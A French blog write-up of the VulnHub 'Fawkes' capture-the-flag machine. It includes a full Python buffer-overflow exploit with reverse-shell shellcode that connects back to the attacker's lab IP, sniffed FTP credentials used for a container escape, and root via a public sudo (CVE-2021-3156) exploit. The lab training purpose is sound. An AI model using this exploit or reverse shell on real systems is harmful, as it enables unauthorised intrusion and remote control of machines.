# Solution du CTF HarryPotter: Fawkes de VulnHub

Et c'est parti
--------------

pour la manche finale de cette série de CTF autour de la saga Harry Potter.  

[La VM](https://www.vulnhub.com/entry/harrypotter-fawkes,686/) de cet article est baptisé *Fawkes* (en français *Fumseck*, le phénix de *Dumbledore*) et contient 3 horcrux (flags) à trouver.  

```plain
Nmap scan report for 192.168.56.3
Host is up (0.00032s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
2222/tcp open  ssh        OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:1d:d5:66:85:24:57:4a:86:4e:d9:b6:00:69:78:8d (RSA)
|   256 0b:31:e7:67:26:c6:4d:12:bf:2a:85:31:bf:21:31:1d (ECDSA)
|_  256 9b:f4:bd:71:fa:16:de:d5:89:ac:69:8d:1e:93:e5:8a (ED25519)
9898/tcp open  monkeycom?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     Welcome to Hogwart's magic portal
|     Tell your spell and ELDER WAND will perform the magic
|     Here is list of some common spells:
|     Wingardium Leviosa
|     Lumos
|     Expelliarmus
|     Alohomora
|     Avada Kedavra 
|     Enter your spell: Magic Output: Oops!! you have given the wrong spell
|     Enter your spell:
|   NULL: 
|     Welcome to Hogwart's magic portal
|     Tell your spell and ELDER WAND will perform the magic
|     Here is list of some common spells:
|     Wingardium Leviosa
|     Lumos
|     Expelliarmus
|     Alohomora
|     Avada Kedavra 
|_    Enter your spell:
```

L'output Nmap retourne bien des informations. On a ainsi un serveur FTP permettant l'accès anonyme et sur lequel se trouve un fichier baptisé *server\_hogwarts*.  

Il s'agit en fait d'un binaire pour Linux :  

```plain
server_hogwarts: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1d09ce1a9929b282f26770218b8d247716869bd0, for GNU/Linux 3.2.0, not stripped
```

Ce binaire est probablement celui utilisé pour le port 9898 qui est un service custom.  

On a ensuite deux ports OpenSSH avec des numéros de versions différentes, c'est sans doute le signe de l'utilisation de container Docker (peu de probabilités que quelqu'un s'embête à compiler et configurer un OpenSSH différent).  

Pour terminer il y a ce serveur web qui après énumération poussée ne semble strictement rien contenir.  

Analyze du binaire
------------------

On ouvre le binaire dans [Cutter](https://cutter.re/) qui nous reporte certaines de ses caractéristiques.  

![VulnHub CTF Fawkes binary protections](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/fawkes/server_hogwarts_binary_characteristics.png)

L'exécutable a sa stack exécutable (pas de NX) donc en cas d'exploitation on pourra poser un shellcode sur la stack (pas besoin de faire du Return Oriented Programming).  

Le flag des canary est activé mais comme on le verra ci-dessous ce n'est en réalité pas le cas.  

Le programme a deux grosses boucles que l'on peut voir via la visualisation des graphes de *Cutter* (pour la fonction *main()*).  

![VulnHub CTF Fawkes binary graph of main function](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/fawkes/server_hogwarts_main_graph.png)

La première boucle est celle de la gestion des clients (tout le code qui suit un *accept()*).  

La seconde boucle s'occupe de la communication avec le client : le programme demande un input (saisir un nom de sortilège) et en fonction de l'entrée va afficher une sortie différente.  

On peut voir ici la logique de if/else pour chaque cas. Tous ces cas sont très simples (provoquent juste de l'envoi de données) et ne sont donc pas exploitables.  

![VulnHub CTF Fawkes logic graph](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/fawkes/server_hogwarts_perform_magic.png)

En revanche juste après la réception des données (on voit que le programme cherche à lire jusqu'à 0x400 octets dans le buffer *var\_450h*) ces dernières sont passées en argument à une fonction baptisée *copy()* que voici :  

![VulnHub CTF Fawkes read loop](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/fawkes/server_hogwarts_read_loop.png)

![VulnHub CTF Fawkes copy disassembly](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/fawkes/server_hogwarts_vulnerable_copy.png)

Le code n'est pas très parlant car le désassembleur indique *section..plt* mais il s'agit en réalité d'un appel à *strcpy()* bien connue pour ne pas vérifier si le buffer de destination a la capacité de stocker le nombre d'octets attendu.  

On voit que dans cette fonction l'espace alouée pour les variables locales (0x74 avec l'instruction *sub esp*) est bien inférieur à la taille potentielle du buffer (0x400).  

On est donc dans un schéma classique de stack-overflow.  

Et enfin comme annoncé plus tôt il n'y a pas de vérification de canary sur cette fonction (pas d'appel à *\_stack\_chk\_fail* comme c'était le cas pour [Brainpan #3](http://devloop.users.sourceforge.net/index.php?article213/solution-du-ctf-brainpan-3-de-vulnhub).  

La suite est assez classique. On utilise son débugger préféré (j'ai personnellement utilisé celui de Cutter qui est en béta) pour lancer le programme et on envoit un buffer suffisemment long en entrée pour voir l'état de la stack lors du crash.  

Pour cela je met un breakpoint sur l'instruction *ret* à la fin de *copy()* et en effet au sommet de la pile je retrouve bien mes octets prêts à écraser cette adresse de retour.  

Maintenant il ne nous reste plus qu'à régler le problème de la randomisation de la pile, ce qui peut se faire avec un petit *gadget* (une instruction hardcodée dans le programme que l'on va réutiliser).  

La vue de dump hexa de Cutter a la particularité d'apposer certains flags sur les adresses.  

Dans l'image ci-dessous on voit le buffer que j'ai envoyé et plusieurs zones encadrées qui ont un flag.  

![VulnHub CTF Fawkes stack memory hexdump](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/fawkes/server_hogwarts_memory.png)

On voit ainsi *esp* (sommet de la pile) qui est écrasé mais aussi le début de notre buffer dont l'adresse correspond à la valeur de *eax*.  

Par conséquent en utilisant un gadget de type *call eax* ou *jmp eax* je sauterais de manière sûre vers mon shellcode (les adresses des instructions n'étant pas touchées par la randomisation).  

[ROPgadget](https://github.com/JonathanSalwan/ROPgadget) me trouve deux instructions courtes qui correspondent à mes besoins :  

```plain
0x08049019 : call eax
0x08054ad6 : jmp eax
```

Pour le reste, comme le montre l'image précédente, on dispose de 112 octets avant d'écraser l'adresse de retour, c'est suffisant pour y placer un shellcode pas trop gourmant.  

A propos de shellcode on pourrait utiliser [celui-ci](https://www.exploit-db.com/shellcodes/47530) qui réutilise la socket courante mais il faut bien sûr savoir qu'elle est la valeur de la socket. Ca pourrait marcher ici mais dans un cas plus réaliste ça peut être compliqué de retrouver la valeur du descripteur de fichier.  

J'ai testé plusieurs shellcodes de type bind de port et à chaque fois ça segfaultait sur la fin pour une raison qui m'échappe. Le port était bien mis en écoute (on peut s'y connecter) mais on n'obtenait pas de shell que ce soit sur la VM ou en local avec le binaire.  

Finalement j'ai utilisé un shellcode de type reverse shell et là pas de problèmes. Voici l'exploit final :  

```python
import socket
from struct import pack, unpack
from ipaddress import IPv4Address

IP = "192.168.56.3"
REVERSE_IP = "192.168.56.1"

# https://www.exploit-db.com/shellcodes/13393
SHELLCODE = (
        b"\x6a\x66"              # push $0x66
        b"\x58"                  # pop %eax
        b"\x99"                  # cltd
        b"\x6a\x01"              # push $0x1
        b"\x5b"                  # pop %ebx
        b"\x52"                  # push %edx
        b"\x53"                  # push %ebx
        b"\x6a\x02"              # push $0x2
        b"\x89\xe1"              # mov %esp,%ecx
        b"\xcd\x80"              # int $0x80
        b"\x5b"                  # pop %ebx
        b"\x5d"                  # pop %ebp
        b"\xbe"
) + pack("I", unpack("I", IPv4Address(REVERSE_IP).packed)[0] ^ 0xFFFFFFFF) + (  # mov REVERSE_IP,%esi
        b"\xf7\xd6"              # not %esi
        b"\x56"                  # push %esi
        b"\x66\xbd\x69\x7a"      # mov $0x7a69,%bp (0x7a69 = 31337)
        b"\x0f\xcd"              # bswap %ebp
        b"\x09\xdd"              # or %ebx,%ebp
        b"\x55"                  # push %ebp
        b"\x43"                  # inc %ebx
        b"\x6a\x10"              # push $0x10
        b"\x51"                  # push %ecx
        b"\x50"                  # push %eax
        b"\xb0\x66"              # mov $0x66,%al

        #
        # <_doint>:
        #

        b"\x89\xe1"              # mov %esp,%ecx
        b"\xcd\x80"              # int $0x80
        b"\x87\xd9"              # xchg %ebx,%ecx
        b"\x5b"                  # pop %ebx

        #
        # <_dup2loop>:
        #

        b"\xb0\x3f"              # mov $0x3f,%al
        b"\xcd\x80"              # int $0x80
        b"\x49"                  # dec %ecx
        b"\x79\xf9"              # jns <_dup2loop>
        b"\xb0\x0b"              # mov $0xb,%al
        b"\x52"                  # push %edx
        b"\x68\x2f\x2f\x73\x68"  # push $0x68732f2f
        b"\x68\x2f\x62\x69\x6e"  # push $0x6e69622f
        b"\x89\xe3"              # mov %esp,%ebx
        b"\x52"                  # push %edx
        b"\x53"                  # push %ebx
        b"\xeb\xdf"              # jmp <_doint>
)

PADDING = b"\x90" * (112 - len(SHELLCODE))
JMP_EAX = 0x08054ad6

buffer = SHELLCODE + PADDING + pack("I", JMP_EAX)

sock = socket.socket()
sock.connect((IP, 9898))
sock.recv(2048)  # Get the banner
sock.send(buffer)
print("Payload sent")

```

On aura préalablement lancé un Ncat :  

```bash
$ ncat -l -p 31337 -v
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 192.168.56.3.
Ncat: Connection from 192.168.56.3:54556.
id
uid=1000(harry) gid=1000(harry) groups=1000(harry)
```

Escape the container
--------------------

On remarque vite un fichier typique d'un environnement conteneurisé à la racine :  

```plain
-rwxr-xr-x    1 root     root             0 Apr 24  2021 .dockerenv
```

Il y a d'autres signes distinctifs comme cette adresse IP commençant par 172 :  

```plain
4: eth0@if5:  mtu 1500 qdisc noqueue state UP 
 link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
 valid\_lft forever preferred\_lft forever
```

Le nom d'hôte qui semble généré aléatoirement :  

```plain
Linux 2b1599256ca6 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 Linux
```

et pour terminer le contenu de */etc/issue* :  

```plain
Welcome to Alpine Linux 3.13
Kernel \r on an \m (\l)
```

Dans le dossier de l'utilisateur *harry* se trouve un fichier *.mycreds.txt* qui contient le mot de passe *HarrYp0tter@Hogwarts123*.  

Ce dernier peut être utilisé pour accéder au compte via le port SSH 2222 ce qui est bénéfique car sur un environnement aussi dépouillé c'est compliqué *d'upgrader* le shell pour l'attacher à un PTY.  

Passer root sur le conteneur est simple comme un *sudo su* :  

```plain

2b1599256ca6:~$ sudo -l
User harry may run the following commands on 2b1599256ca6:
    (ALL) NOPASSWD: ALL
```

En faisant le curieux on retrouve le script chargé de lancer les services :  

```bash
#!/bin/sh

sudo -u harry /opt/run_server_hogwarts.sh &
/usr/sbin/sshd
/usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf &
/usr/sbin/crond -f
```

Le script mentionné lance le service vulnérable :  

```bash
#!/bin/sh
is_running=$(netstat -nltup | grep 9898)

if [ -z "$is_running" ];then
        #nohup /opt/server_hogwarts > /dev/null &
        /opt/server_hogwarts 
else
        echo "[-] Server already running"
fi
```

Dans le dossier de *root* se trouve le premier horcrux :  

```plain
horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=}
```

Ainsi qu'une note :  

```plain
Hello Admin!!

We have found that someone is trying to login to our ftp server by mistake.
You are requested to analyze the traffic and figure out the user.
```

Ecoutons donc ce qu'il se passe sur ce port 21 :  

```plain
2b1599256ca6:~# tcpdump -X "tcp port 21"
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes

14:44:01.113346 IP 172.17.0.1.60556 > 2b1599256ca6.21: Flags [P.], seq 1:15, ack 21, win 502, options [nop,nop,TS val 3766966003 ecr 1875392170], length 14: FTP: USER neville
        0x0000:  4510 0042 0d5c 4000 4006 d524 ac11 0001  E..B.\@.@..$....
        0x0010:  ac11 0002 ec8c 0015 0691 b0c4 70c9 44c9  ............p.D.
        0x0020:  8018 01f6 585a 0000 0101 080a e087 56f3  ....XZ........V.
        0x0030:  6fc8 36aa 5553 4552 206e 6576 696c 6c65  o.6.USER.neville
        0x0040:  0d0a                                     ..
14:44:01.113354 IP 2b1599256ca6.21 > 172.17.0.1.60556: Flags [.], ack 15, win 510, options [nop,nop,TS val 1875392170 ecr 3766966003], length 0
        0x0000:  4500 0034 2e4c 4000 4006 b452 ac11 0002  E..4.L@.@..R....
        0x0010:  ac11 0001 0015 ec8c 70c9 44c9 0691 b0d2  ........p.D.....
        0x0020:  8010 01fe 584c 0000 0101 080a 6fc8 36aa  ....XL......o.6.
        0x0030:  e087 56f3                                ..V.
14:44:01.113421 IP 2b1599256ca6.21 > 172.17.0.1.60556: Flags [P.], seq 21:55, ack 15, win 510, options [nop,nop,TS val 1875392171 ecr 3766966003], length 34: FTP: 331 Please specify the password.
        0x0000:  4500 0056 2e4d 4000 4006 b42f ac11 0002  E..V.M@.@../....
        0x0010:  ac11 0001 0015 ec8c 70c9 44c9 0691 b0d2  ........p.D.....
        0x0020:  8018 01fe 586e 0000 0101 080a 6fc8 36ab  ....Xn......o.6.
        0x0030:  e087 56f3 3333 3120 506c 6561 7365 2073  ..V.331.Please.s
        0x0040:  7065 6369 6679 2074 6865 2070 6173 7377  pecify.the.passw
        0x0050:  6f72 642e 0d0a                           ord...
14:44:01.113500 IP 172.17.0.1.60556 > 2b1599256ca6.21: Flags [P.], seq 15:30, ack 55, win 502, options [nop,nop,TS val 3766966004 ecr 1875392171], length 15: FTP: PASS bL!Bsg3k
        0x0000:  4510 0043 0d5d 4000 4006 d522 ac11 0001  E..C.]@.@.."....
        0x0010:  ac11 0002 ec8c 0015 0691 b0d2 70c9 44eb  ............p.D.
        0x0020:  8018 01f6 585b 0000 0101 080a e087 56f4  ....X[........V.
        0x0030:  6fc8 36ab 5041 5353 2062 4c21 4273 6733  o.6.PASS.bL!Bsg3
        0x0040:  6b0d 0a                                  k..
```

Cette fois ces identifiants donnent accès au SSH sur le port 22 et il ne s'agit pas du container :  

```plain
$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:71:68:86 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.3/24 brd 192.168.56.255 scope global dynamic enp0s3
       valid_lft 588sec preferred_lft 588sec
    inet6 fe80::a00:27ff:fe71:6886/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:f7:a4:6c:46 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:f7ff:fea4:6c46/64 scope link 
       valid_lft forever preferred_lft forever
5: vethb876b05@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether ba:74:7e:23:ed:5c brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::b874:7eff:fe23:ed5c/64 scope link 
       valid_lft forever preferred_lft forever
```

On y récupère le second horcrux :  

```plain
horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t}
```

Last train to root
------------------

J'ai fait tourner [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) qui n'a rien remonté de bien critique ou avéré :  

```pl
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 363752 Apr 30  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 9731 Mar 19  2021 /usr/lib/modules/4.19.0-16-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 neville neville 1556 Apr  7  2021 /etc/passwd.bak
-rw-r--r-- 1 root root 4096 Dec  6 20:20 /sys/devices/virtual/net/vethb876b05/brport/backup_port
```

On a une backup du */etc/passwd* dont le propriétaire est *neville* alors que le fichier est dans */etc*, sans doute un indice.  

Il y a aussi [cet exploit PTRACE\_TRACEME](https://www.exploit-db.com/exploits/47133) mais sans entrer dans les détails il n'était pas exploitable ici (manque d'une condition).  

En cherchant sur exploit-db on trouve deux vulnérabilités qui peuvent toucher la version du Sudo.  

[La première](https://www.exploit-db.com/exploits/47502) nécessite malheureusement une entrée dans sudoers qui n'est pas le cas ici.  

[La seconde](https://www.exploit-db.com/exploits/49521) baptisée *Baron Samedit* a différents exploits trouvés ici et là. Ceux de exploit-db n'ont mené nul part, le module de Metasploit a échoué aussi. Finalement [ce dernier](https://github.com/worawit/CVE-2021-3156) est passé comme une lettre à la poste :  

```plain
$ python3 exploit_nss.py
# id
uid=0(root) gid=0(root) groups=0(root),1000(neville)
# cd /root
# ls
horcrux3.txt
# cat horcrux3.txt
__     __    _     _                           _     _     
\ \   / /__ | | __| | ___ _ __ ___   ___  _ __| |_  (_)___ 
 \ \ / / _ \| |/ _` |/ _ \ '_ ` _ \ / _ \| '__| __| | / __|
  \ V / (_) | | (_| |  __/ | | | | | (_) | |  | |_  | \__ \
   \_/ \___/|_|\__,_|\___|_| |_| |_|\___/|_|   \__| |_|___/

     _       __            _           _ 
  __| | ___ / _| ___  __ _| |_ ___  __| |
 / _` |/ _ \ |_ / _ \/ _` | __/ _ \/ _` |
| (_| |  __/  _|  __/ (_| | ||  __/ (_| |
 \__,_|\___|_|  \___|\__,_|\__\___|\__,_|

Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Hard
Machine Name: Fawkes
Horcruxes Hidden in this VM: 3 horcruxes

You have successfully pwned Fawkes machine & defeated Voldemort.
Here is your last hocrux: horcrux_{ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==}
```


*Published December 07 2021 at 12:04*